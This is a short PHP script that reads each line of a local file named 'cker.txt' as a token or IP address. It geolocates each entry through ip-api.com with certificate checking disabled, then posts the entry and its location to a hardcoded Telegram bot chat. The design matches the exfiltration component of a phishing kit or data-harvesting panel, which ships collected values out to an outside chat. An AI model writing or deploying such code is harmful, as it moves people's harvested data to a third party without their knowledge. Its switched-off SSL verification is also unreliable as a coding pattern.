<?php

function ip_info($ip) {
  $c = curl_init();
  curl_setopt($c, CURLOPT_URL, "http://ip-api.com/csv/".$ip. "");
  curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
  $exec = curl_exec($c);
  curl_close($c);
  return $exec;
} function sendTelegramMessage($msg) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot7067426950:#/sendMessage");
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'chat_id' => "6107005393",
    'text' => $msg,
    "parse_mode" => 'html',
    'disable_web_page_preview' => true,
  ]));
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $response = curl_exec($ch);
  curl_close($ch);
}



$filePath = "cker.txt";
$lines = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
foreach($lines as $token) {
  sendTelegramMessage("$token    -  ".ip_info($token));
}
